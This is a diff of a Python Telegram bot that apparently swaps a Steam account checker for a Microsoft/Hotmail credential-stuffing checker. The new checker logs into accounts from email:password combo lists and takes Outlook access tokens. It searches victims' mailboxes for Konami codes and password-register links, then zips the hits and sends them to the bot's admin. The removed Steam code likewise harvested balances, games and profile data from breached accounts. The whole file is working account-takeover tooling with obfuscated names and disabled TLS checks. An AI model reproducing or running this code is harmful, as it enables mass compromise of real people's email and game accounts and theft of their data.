@@ -1,8 +1,10 @@
-import sys, os, re, json, time, random, threading, requests, base64
-from datetime import datetime
+import sys, os, re, json, time, random, threading, requests, zipfile
+from urllib.parse import urlparse, parse_qs
+from datetime import datetime, timedelta
 import urllib3
-from Crypto.PublicKey import RSA
-from Crypto.Cipher import PKCS1_v1_5
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
+from email.utils import parsedate_to_datetime
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -11,7 +13,16 @@ ADMIN_ID = 7969180514
 
 THREAD_COUNT = 5
 
-HITS_FILE = "steamhits.txt"
+HITS_FILE = "hotmailhits.txt"
+KONAMI_HITS_FILE = "konamihits.txt"
+KONAMI_MESAJLI_HITS_FILE = "konamimesajlihits.txt"
+TWOFA_FILE = "2fa.txt"
+BAD_FILE = "bad.txt"
+ZIP_FILE = "konamicombohits.zip"
+
+KONAMI_EMAIL = "konami-info@konami.net"
+KOD_PATTERN = r'\b\d{6}\b'
+REGISTER_PATTERN = "https://my.konami.net/en_GB/password-reminder/register-password"
 
 tarama_durdur = {}
 multi_bekleyen = {}
@@ -55,7 +66,7 @@ def kerpetennecmi(line):
         if sep in line:
             parts = line.split(sep, 1)
             email, pwd = parts[0].strip(), parts[1].strip()
-            if email and pwd:
+            if email and pwd and "@" in email:
                 return f"{email}:{pwd}"
     return None
 
@@ -78,268 +89,298 @@ def cokludosyayukle(dosya_listesi):
             pass
     return list(dict.fromkeys(tum_hesaplar))
 
-def benferooolum():
-    with open(HITS_FILE, 'w', encoding='utf-8') as fh:
-        pass
+batmanparkyetkilisi = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+]
 
-class SteamChecker:
-    def __init__(self, timeout=30):
-        self.timeout = timeout
-        self.session = None
+def ataturkparki():
+    return random.choice(batmanparkyetkilisi)
 
-    def _create_session(self):
-        self.session = requests.Session()
-        self.session.verify = False
-        self.session.headers.update({
-            "User-Agent": random.choice([
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36",
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
-                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36",
-            ]),
-            "Accept": "application/json, text/plain, */*",
-            "Accept-Language": "en-US,en;q=0.9",
-            "Origin": "https://store.steampowered.com",
-            "Referer": "https://store.steampowered.com/",
-        })
-        return self.session
+class marazali:
+    REQ = 25
 
-    def check(self, username: str, password: str):
-        self._create_session()
+    def __init__(self, email, password, proxy=None):
+        self.email = email
+        self.password = password
+        self.proxy = proxy
+        self.s = self.toyotacorollabest()
+        if proxy:
+            self.s.proxies = {"http": proxy, "https": proxy}
+        self.cid = ""
+        self.gelsinhayatbildigigibi = None
+        self.bilmemhangiruzgaratti = None
+        self.sahteparantezleracmasakin = (
+            "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328"
+            "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
+            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
+            "&display=touch&response_type=token&locale=en"
+        )
+
+    def toyotacorollabest(self):
+        s = requests.Session()
+        retry = Retry(total=3, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
+        adapter = HTTPAdapter(max_retries=retry, pool_connections=50, pool_maxsize=50)
+        s.mount("https://", adapter)
+        s.mount("http://", adapter)
+        return s
+
+    def nihathatipoglu(self, tag):
         try:
-            rsa_resp = self.session.get(
-                "https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/",
-                params={"account_name": username},
-                timeout=self.timeout
-            ).json().get("response", {})
-            
-            if not rsa_resp.get("publickey_mod"):
-                return {"status": "BAD", "error": "RSA key failed"}
-
-            key = RSA.construct((int(rsa_resp["publickey_mod"], 16), int(rsa_resp["publickey_exp"], 16)))
-            enc_pwd = base64.b64encode(PKCS1_v1_5.new(key).encrypt(password.encode())).decode()
-
-            resp = self.session.post(
-                "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/",
-                data={
-                    "account_name": username,
-                    "encrypted_password": enc_pwd,
-                    "encryption_timestamp": rsa_resp["timestamp"],
-                    "remember_login": "true",
-                    "website_id": "Community",
-                    "device_friendly_name": "Julian-Checker"
-                },
-                timeout=self.timeout
-            ).json().get("response", {})
-
-            steamid = resp.get("steamid")
-            if not steamid:
-                return {"status": "BAD", "error": "No steamid"}
-
-            guard_types = [c.get("confirmation_type", 0) for c in resp.get("allowed_confirmations", [])]
-            if any(t in (3, 4) for t in guard_types):
-                return {"status": "2FA", "steamid": steamid, "username": username}
-
-            time.sleep(0.5)
-            poll = self.session.post(
-                "https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1/",
-                data={"client_id": resp["client_id"], "request_id": resp["request_id"]},
-                timeout=self.timeout
-            ).json().get("response", {})
-
-            access = poll.get("access_token")
-            if not access:
-                return {"status": "BAD", "error": "No access token"}
-
-            self.session.cookies.set("steamLoginSecure", f"{steamid}||{access}", domain=".steamcommunity.com")
-
-            result = {
-                "status": "HIT",
-                "steamid": steamid,
-                "username": username,
-                "password": password,
+            h = {
+                "User-Agent": ataturkparki(),
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Connection": "keep-alive",
             }
+            r = self.s.get(self.sahteparantezleracmasakin, headers=h, timeout=self.REQ, verify=False)
+            text = r.text
+            m = (re.search(r'value=\\"(.+?)\\"', text, re.S)
+                 or re.search(r'value="(.+?)"', text, re.S)
+                 or re.search(r"sFTTag:'(.+?)'", text, re.S)
+                 or re.search(r'sFTTag:"(.+?)"', text, re.S)
+                 or re.search(r'name="PPFT".*?value="(.+?)"', text, re.S))
+            if not m:
+                return "BAD"
+            sFTTag = m.group(1)
+            m2 = (re.search(r'"urlPost":"(.+?)"', text, re.S)
+                  or re.search(r"urlPost:'(.+?)'", text, re.S)
+                  or re.search(r'urlPost:"(.+?)"', text, re.S)
+                  or re.search(r'<form.*?action="(.+?)"', text, re.S))
+            if not m2:
+                return "BAD"
+            urlPost = m2.group(1).replace("&amp;", "&")
+            data = {
+                "login": self.email,
+                "loginfmt": self.email,
+                "passwd": self.password,
+                "PPFT": sFTTag
+            }
+            h2 = {
+                "Content-Type": "application/x-www-form-urlencoded",
+                "User-Agent": ataturkparki(),
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Connection": "close"
+            }
+            r2 = self.s.post(urlPost, data=data, headers=h2,
+                             allow_redirects=True, timeout=self.REQ, verify=False)
+            if "#" in r2.url and r2.url != self.sahteparantezleracmasakin:
+                token = parse_qs(urlparse(r2.url).fragment).get("access_token", ["None"])[0]
+                if token != "None":
+                    self.gelsinhayatbildigigibi = token
+                    return "SUCCESS"
+            if "cancel?mkt=" in r2.text:
+                try:
+                    kotukardesim = re.search(r'(?<="ipt" value=").+?(?=">)', r2.text)
+                    oyleeeemi = re.search(r'(?<="pprid" value=").+?(?=">)', r2.text)
+                    hmmm = re.search(r'(?<="uaid" value=").+?(?=">)', r2.text)
+                    if kotukardesim and oyleeeemi and hmmm:
+                        dota2mioynuyoz = {"ipt": kotukardesim.group(), "pprid": oyleeeemi.group(), "uaid": hmmm.group()}
+                        action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', r2.text)
+                        if action:
+                            ret = self.s.post(action.group(), data=dota2mioynuyoz,
+                                              allow_redirects=True, timeout=self.REQ, verify=False)
+                            kurmancihergulee = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text)
+                            if kurmancihergulee:
+                                fin = self.s.get(kurmancihergulee.group(), allow_redirects=True,
+                                                 timeout=self.REQ, verify=False)
+                                token = parse_qs(urlparse(fin.url).fragment).get("access_token", ["None"])[0]
+                                if token != "None":
+                                    self.gelsinhayatbildigigibi = token
+                                    return "SUCCESS"
+                except:
+                    pass
+            if any(v in r2.text for v in [
+                "recover?mkt", "account.live.com/identity/confirm?mkt",
+                "Email/Confirm?mkt", "/Abuse?mkt=", ",AC:null,urlFedConvertRename"
+            ]):
+                return "2FA"
+            fatihterim = r2.text.lower()
+            if any(v in fatihterim for v in [
+                "password is incorrect", "account doesn't exist",
+                "that microsoft account doesn't exist",
+                "sign in to your microsoft account",
+                "tried to sign in too many times",
+                "help us protect your account", "your account or password is incorrect"
+            ]):
+                return "BAD"
+            return "BAD"
+        except:
+            return "ERROR"
 
-            # Profil
-            try:
-                r = self.session.get(
-                    "https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v2/",
-                    params={"access_token": access, "steamids": steamid},
-                    timeout=10
-                )
-                if r.status_code == 200:
-                    players = r.json().get("response", {}).get("players", [])
-                    if players:
-                        p = players[0]
-                        result["name"] = p.get("personaname", "N/A")
-                        result["realname"] = p.get("realname", "Gizli")
-                        result["country"] = p.get("loccountrycode", "—")
-                        result["profile_url"] = p.get("profileurl", "")
-                        if p.get("timecreated"):
-                            result["created_date"] = datetime.fromtimestamp(p["timecreated"]).strftime("%d/%m/%Y")
-            except:
-                pass
+    def kimseyisevemem(self, tag):
+        try:
+            self.sahteparantezleracmasakin = (
+                "https://login.live.com/oauth20_authorize.srf?"
+                "client_id=00000000402B5328"
+                "&response_type=token"
+                "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
+                "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
+                "&prompt=none"
+            )
+            h = {"User-Agent": ataturkparki()}
+            r = self.s.get(self.sahteparantezleracmasakin, headers=h, timeout=self.REQ, verify=False, allow_redirects=True)
+            parsed = urlparse(r.url)
+            if parsed.fragment:
+                tok = parse_qs(parsed.fragment).get("access_token", [None])[0]
+                if tok:
+                    self.gelsinhayatbildigigibi = tok
+                    return tok
+            self.soyleyememyeminederim = (
+                "https://login.live.com/oauth20_authorize.srf?"
+                "client_id=0000000048170EF2"
+                "&response_type=token"
+                "&scope=https%3A%2F%2Fsubstrate.office.com%2FUser-Internal.ReadWrite"
+                "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
+                "&prompt=none"
+            )
+            r = self.s.get(self.soyleyememyeminederim, headers=h, timeout=self.REQ, verify=False, allow_redirects=True)
+            parsed = urlparse(r.url)
+            if parsed.fragment:
+                tok = parse_qs(parsed.fragment).get("access_token", [None])[0]
+                if tok:
+                    self.bilmemhangiruzgaratti = tok
+                    return tok
+            return None
+        except:
+            return None
 
-            # Ban
-            try:
-                r = self.session.get(
-                    "https://api.steampowered.com/ISteamUser/GetPlayerBans/v1/",
-                    params={"access_token": access, "steamids": steamid},
-                    timeout=10
-                )
-                if r.status_code == 200:
-                    p = r.json().get("players", [{}])[0]
-                    result["vac_banned"] = p.get("VACBanned", False)
-                    result["game_bans"] = p.get("NumberOfGameBans", 0)
-                    if p.get("VACBanned"):
-                        result["vac"] = "🚫 VAC BAN"
-                    elif p.get("NumberOfGameBans", 0) > 0:
-                        result["vac"] = f"🚫 {p.get('NumberOfGameBans', 0)} GAME BAN"
-                    else:
-                        result["vac"] = "✅ Temiz"
-            except:
-                pass
+    def ahhhelerimtitriyor(self, tag):
+        try:
+            pikniksararbugunlerde = self.s.cookies.get("MSPCID", "")
+            if pikniksararbugunlerde:
+                self.cid = pikniksararbugunlerde.upper()
+                return True
+            ofbiratesbasiyor = re.search(r'MSPCID=([^;\s]+)', str(self.s.cookies))
+            if ofbiratesbasiyor:
+                self.cid = ofbiratesbasiyor.group(1).upper()
+                return True
+            self.cid = self.email.upper().replace("@", "").replace(".", "")
+            return True
+        except:
+            return False
 
-            # Level
-            try:
-                r = self.session.get(
-                    "https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/",
-                    params={"access_token": access, "steamid": steamid},
-                    timeout=10
-                )
-                if r.status_code == 200:
-                    result["level"] = r.json().get("response", {}).get("player_level", 0)
-            except:
-                pass
+    def konami_mesaj_tara(self, token):
+        """Konami'den gelen tüm mesajları tara"""
+        try:
+            url = "https://outlook.live.com/search/api/v2/query"
+            params = {"n": "124", "cv": "tNZ1DVP5NhDwG%2FDUCelaIu.124"}
+            query = f'from:"{KONAMI_EMAIL}"'
+            body = {
+                "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
+                "Scenario": {"Name": "owa.react"},
+                "TimeZone": "Egypt Standard Time",
+                "TextDecorations": "Off",
+                "EntityRequests": [{
+                    "EntityType": "Conversation",
+                    "ContentSources": ["Exchange"],
+                    "Filter": {"Or": [
+                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
+                        {"Term": {"DistinguishedFolderName": "DeletedItems"}}
+                    ]},
+                    "From": 0,
+                    "Query": {"QueryString": query},
+                    "RefiningQueries": None,
+                    "Size": 500,
+                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}],
+                    "EnableTopResults": True,
+                    "TopResultsCount": 3
+                }],
+                "AnswerEntityRequests": [{
+                    "Query": {"QueryString": query},
+                    "EntityTypes": ["Event", "File"],
+                    "From": 0,
+                    "Size": 10,
+                    "EnableAsyncResolution": True
+                }],
+                "QueryAlterationOptions": {
+                    "EnableSuggestion": True,
+                    "EnableAlteration": True,
+                    "SupportedRecourseDisplayTypes": ["Suggestion", "NoResultModification", "NoResultFolderRefinerModification", "NoRequeryModification", "Modification"]
+                },
+                "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c"
+            }
+            h = {
+                "User-Agent": "Outlook-Android/2.0",
+                "Authorization": f"Bearer {token}",
+                "X-AnchorMailbox": f"CID:{self.cid}",
+                "Connection": "Keep-Alive",
+                "Accept-Encoding": "gzip",
+                "Content-Type": "application/json",
+            }
+            r = self.s.post(url, params=params, headers=h, json=body, timeout=30, verify=False)
+            
+            if r.status_code != 200:
+                return 0, False, False
+            
+            data = r.json()
+            
+            total = 0
+            has_kod = False
+            has_register = False
+            
+            # Toplam mesaj sayısı
+            for es in data.get("EntitySets", []):
+                if es.get("Total") is not None:
+                    total = es.get("Total", 0)
+                    break
+            
+            if total == 0:
+                total_match = re.search(r'"Total":\s*(\d+)', r.text)
+                if total_match:
+                    total = int(total_match.group(1))
+            
+            # Tüm mesajlarda kod ve register linki ara
+            for es in data.get("EntitySets", []):
+                results = es.get("Results", [])
+                for res in results:
+                    res_text = str(res)
+                    if re.search(KOD_PATTERN, res_text):
+                        has_kod = True
+                    if REGISTER_PATTERN in res_text:
+                        has_register = True
+            
+            return total, has_kod, has_register
+        except:
+            return 0, False, False
 
-            # Oyunlar
-            try:
-                r = self.session.get(
-                    "https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/",
-                    params={"access_token": access, "steamid": steamid, "include_appinfo": "true", "include_played_free_games": "true"},
-                    timeout=60
-                )
-                if r.status_code == 200:
-                    games = r.json().get("response", {}).get("games", [])
-                    games_sorted = sorted(games, key=lambda x: x.get("playtime_forever", 0), reverse=True)
-                    result["game_count"] = len(games_sorted)
-                    result["total_playtime_hours"] = sum(g.get("playtime_forever", 0) for g in games_sorted) // 60
-                    result["all_games"] = games_sorted
-            except:
-                pass
-
-            # Bakiye
-            try:
-                r = self.session.get(
-                    f"https://store.steampowered.com/api/getWalletBalance/?steamid={steamid}",
-                    timeout=10
-                )
-                if r.status_code == 200 and r.json().get("success"):
-                    result["balance"] = r.json().get("formattedBalance", "—")
-            except:
-                pass
-
-            # CS2 Envanter
-            try:
-                r = self.session.get(
-                    f"https://steamcommunity.com/inventory/{steamid}/730/2",
-                    params={"l": "english", "count": "5000"},
-                    timeout=15
-                )
-                if r.status_code == 200:
-                    count = r.json().get("total_inventory_count", 0)
-                    result["inventory_count"] = count
-            except:
-                pass
-
-            # Arkadaş
-            try:
-                r = self.session.get(
-                    "https://api.steampowered.com/ISteamUser/GetFriendList/v1/",
-                    params={"access_token": access, "steamid": steamid, "relationship": "friend"},
-                    timeout=10
-                )
-                if r.status_code == 200:
-                    friends = r.json().get("friendslist", {}).get("friends", [])
-                    result["friend_count"] = len(friends)
-            except:
-                pass
-
-            result["last_login"] = datetime.now().strftime("%d/%m/%Y %H:%M")
-            return result
-
-        except requests.exceptions.Timeout:
-            return {"status": "BAD", "error": "Timeout"}
-        except requests.exceptions.ConnectionError:
-            return {"status": "BAD", "error": "Connection error"}
-        except Exception as e:
-            return {"status": "BAD", "error": str(e)[:100]}
-        finally:
-            if self.session:
-                self.session.close()
-
-def hit_mesaji(result):
-    """Hit için Telegram mesajı oluştur"""
-    now = datetime.now().strftime('%d.%m.%Y %H:%M:%S')
-    mesaj = f"🎮 KIDO FULL CAPTURE - {now}\n\n"
-    mesaj += f"👤 Kullanıcı    : {result.get('username', 'N/A')}\n"
-    mesaj += f"🔑 Şifre        : {result.get('password', 'N/A')}\n"
-    mesaj += f"📛 İsim         : {result.get('name', 'N/A')}\n"
-    mesaj += f"🌍 Ülke         : {result.get('country', '—')}\n"
-    mesaj += f"💰 Bakiye       : {result.get('balance', '—')}\n"
-    mesaj += f"⭐ Seviye       : Lv.{result.get('level', '0')}\n"
-    mesaj += f"🚫 VAC          : {result.get('vac', '✅ Temiz')}\n"
-    mesaj += f"👥 Arkadaş      : {result.get('friend_count', 0)}\n"
-    mesaj += f"🎒 CS2 Eşya     : {result.get('inventory_count', 0)}\n"
-    mesaj += f"⏱ Oynama       : {result.get('total_playtime_hours', 0)} saat\n"
-    mesaj += f"🆔 SteamID      : {result.get('steamid', 'N/A')}\n"
-    mesaj += f"🎮 Oyun Sayısı  : {result.get('game_count', 0)}\n"
-    
-    games = result.get('all_games', [])
-    if games:
-        mesaj += f"\n🎯 TÜM OYUNLAR ({len(games)} adet)\n"
-        for game in games[:20]:
-            hours = game.get('playtime_forever', 0) // 60
-            name = game.get('name', 'Unknown')
-            mesaj += f"• {name[:40]} ({hours} saat)\n"
-        if len(games) > 20:
-            mesaj += f"... ve {len(games) - 20} oyun daha\n"
-    
-    mesaj += f"\n@KIDO • discord:projectsystem"
-    return mesaj
-
-def hit_dosyaya_yaz(result):
-    """Hit'i dosyaya kaydet"""
-    now = datetime.now().strftime('%d.%m.%Y %H:%M:%S')
-    with open(HITS_FILE, 'a', encoding='utf-8') as f:
-        f.write(f"\n{'='*70}\n")
-        f.write(f"🎮 KIDO FULL CAPTURE - {now}\n")
-        f.write(f"{'='*70}\n")
-        f.write(f"👤 Kullanıcı    : {result.get('username', 'N/A')}\n")
-        f.write(f"🔑 Şifre        : {result.get('password', 'N/A')}\n")
-        f.write(f"📛 İsim         : {result.get('name', 'N/A')}\n")
-        f.write(f"🌍 Ülke         : {result.get('country', '—')}\n")
-        f.write(f"💰 Bakiye       : {result.get('balance', '—')}\n")
-        f.write(f"⭐ Seviye       : Lv.{result.get('level', '0')}\n")
-        f.write(f"🚫 VAC          : {result.get('vac', '✅ Temiz')}\n")
-        f.write(f"👥 Arkadaş      : {result.get('friend_count', 0)}\n")
-        f.write(f"🎒 CS2 Eşya     : {result.get('inventory_count', 0)}\n")
-        f.write(f"⏱ Oynama       : {result.get('total_playtime_hours', 0)} saat\n")
-        f.write(f"🆔 SteamID      : {result.get('steamid', 'N/A')}\n")
-        f.write(f"🎮 Oyun Sayısı  : {result.get('game_count', 0)}\n")
+    def check(self, tag):
+        status = self.nihathatipoglu(tag)
+        if status != "SUCCESS":
+            return status, None
+        self.ahhhelerimtitriyor(tag)
+        token = self.kimseyisevemem(tag)
+        if not token:
+            return "BAD", None
         
-        games = result.get('all_games', [])
-        if games:
-            f.write(f"\n{'─'*70}\n")
-            f.write(f"🎯 TÜM OYUNLAR ({len(games)} adet)\n")
-            f.write(f"{'─'*70}\n")
-            for game in games:
-                hours = game.get('playtime_forever', 0) // 60
-                name = game.get('name', 'Unknown')
-                f.write(f"  • {name} ({hours} saat)\n")
+        total, has_kod, has_register = self.konami_mesaj_tara(token)
         
-        f.write(f"\n{'='*70}\n")
-        f.write(f"@KIDO • discord:projectsystem\n")
-        f.write(f"{'='*70}\n\n")
+        if total > 0:
+            if has_kod or has_register:
+                return "KONAMI_MESAJLI", {"total": total, "kod": has_kod, "register": has_register}
+            else:
+                return "KONAMI_HIT", {"total": total}
+        
+        return "SUCCESS", None
+
+def create_zip():
+    try:
+        with zipfile.ZipFile(ZIP_FILE, 'w', zipfile.ZIP_DEFLATED) as zf:
+            for f in [KONAMI_MESAJLI_HITS_FILE, KONAMI_HITS_FILE, HITS_FILE, TWOFA_FILE, BAD_FILE]:
+                if os.path.exists(f) and os.path.getsize(f) > 0:
+                    zf.write(f, os.path.basename(f))
+        return True
+    except:
+        return False
+
+def benferooolum():
+    for f in [KONAMI_MESAJLI_HITS_FILE, KONAMI_HITS_FILE, HITS_FILE, TWOFA_FILE, BAD_FILE]:
+        with open(f, 'w', encoding='utf-8') as fh:
+            pass
 
 def ana_menu(chat_id):
     if str(chat_id) != str(ADMIN_ID):
@@ -356,8 +397,8 @@ def ana_menu(chat_id):
     
     text = (
         f"╔══════════════════════════════════════════════╗\n"
-        f"║     STEAM ULTIMATE CHECKER - KIDO          ║\n"
-        f"║     👑 ADMIN ONLY 👑                       ║\n"
+        f"║     KONAMI COMBO CHECKER - JULIAN           ║\n"
+        f"║     👑 ADMIN ONLY 👑                        ║\n"
         f"╚══════════════════════════════════════════════╝\n\n"
         f"⚡ Thread: {THREAD_COUNT}\n"
     )
@@ -394,7 +435,7 @@ def tarama_yap(chat_id, accounts, dosya_adi):
     babasarkikalmadi = time.time()
     tarama_durdur[chat_id] = False
     
-    egriegri = {"checked": 0, "hit": 0, "bad": 0, "twofa": 0, "errors": 0}
+    egriegri = {"checked": 0, "konami_mesajli": 0, "konami_hit": 0, "hit": 0, "twofa": 0, "bad": 0, "errors": 0}
     
     lock = threading.Lock()
     semaphore = threading.BoundedSemaphore(THREAD_COUNT)
@@ -409,23 +450,39 @@ def tarama_yap(chat_id, accounts, dosya_adi):
             if tarama_durdur.get(chat_id, False):
                 semaphore.release()
                 return
-            username, password = combo.split(":", 1)
+            email, password = combo.split(":", 1)
+            tag = email.split("@")[0][:12]
             
-            checker = SteamChecker(30)
-            result = checker.check(username, password)
+            c = marazali(email, password, None)
+            status, info = c.check(tag)
             
             with lock:
-                if result.get("status") == "HIT":
+                if status == "KONAMI_MESAJLI":
+                    egriegri["konami_mesajli"] += 1
+                    with open(KONAMI_MESAJLI_HITS_FILE, 'a', encoding='utf-8') as f:
+                        f.write(combo + "\n")
+                    with open(KONAMI_HITS_FILE, 'a', encoding='utf-8') as f:
+                        f.write(combo + "\n")
+                    print(f"🎮 KONAMI MESAJLI: {combo}", flush=True)
+                elif status == "KONAMI_HIT":
+                    egriegri["konami_hit"] += 1
+                    with open(KONAMI_HITS_FILE, 'a', encoding='utf-8') as f:
+                        f.write(combo + "\n")
+                    print(f"✅ KONAMI HIT: {combo}", flush=True)
+                elif status == "SUCCESS":
                     egriegri["hit"] += 1
-                    hit_dosyaya_yaz(result)
-                    mesaj = hit_mesaji(result)
-                    send_message(chat_id, mesaj)
-                    print(f"✅ HIT: {username}", flush=True)
-                elif result.get("status") == "2FA":
+                    with open(HITS_FILE, 'a', encoding='utf-8') as f:
+                        f.write(combo + "\n")
+                    print(f"✅ HIT: {combo}", flush=True)
+                elif status == "2FA":
                     egriegri["twofa"] += 1
-                    print(f"🔐 2FA: {username}", flush=True)
+                    with open(TWOFA_FILE, 'a', encoding='utf-8') as f:
+                        f.write(combo + "\n")
+                    print(f"🔐 2FA: {combo}", flush=True)
                 else:
                     egriegri["bad"] += 1
+                    with open(BAD_FILE, 'a', encoding='utf-8') as f:
+                        f.write(combo + "\n")
         except Exception as e:
             with lock:
                 egriegri["errors"] += 1
@@ -442,6 +499,8 @@ def tarama_yap(chat_id, accounts, dosya_adi):
                 break
             with lock:
                 checked = egriegri["checked"]
+                konami_m = egriegri["konami_mesajli"]
+                konami = egriegri["konami_hit"]
                 hit = egriegri["hit"]
                 twofa = egriegri["twofa"]
                 bad = egriegri["bad"]
@@ -457,6 +516,8 @@ def tarama_yap(chat_id, accounts, dosya_adi):
                 f"📁 File: {dosya_adi}\n"
                 f"📊 Progress: {checked}/{total} ({yuzde:.1f}%)\n"
                 f"{bar}\n\n"
+                f"🎮 KONAMI MESAJLI: {konami_m}\n"
+                f"✅ KONAMI HITS: {konami}\n"
                 f"✅ HITS: {hit}\n"
                 f"🔐 2FA: {twofa}\n"
                 f"❌ BAD: {bad}\n"
@@ -490,11 +551,14 @@ def tarama_yap(chat_id, accounts, dosya_adi):
 
     elapsed = time.time() - babasarkikalmadi
     durdu = tarama_durdur.get(chat_id, False)
+    zip_olustu = create_zip()
     
     stats = (
         f"{'⏹️ SCAN STOPPED' if durdu else '✅ SCAN COMPLETED'} ({int(elapsed)}s)\n\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"🔱 Total: {dogrudogru}\n"
+        f"🎮 KONAMI MESAJLI: {egriegri['konami_mesajli']}\n"
+        f"✅ KONAMI HITS: {egriegri['konami_hit']}\n"
         f"✅ HITS: {egriegri['hit']}\n"
         f"🔐 2FA: {egriegri['twofa']}\n"
         f"❌ BAD: {egriegri['bad']}\n"
@@ -504,8 +568,8 @@ def tarama_yap(chat_id, accounts, dosya_adi):
     )
     send_message(chat_id, stats)
     
-    if os.path.exists(HITS_FILE) and os.path.getsize(HITS_FILE) > 0:
-        send_document(chat_id, HITS_FILE)
+    if zip_olustu:
+        send_document(chat_id, ZIP_FILE)
 
 def telegram_bot():
     global offset, THREAD_COUNT
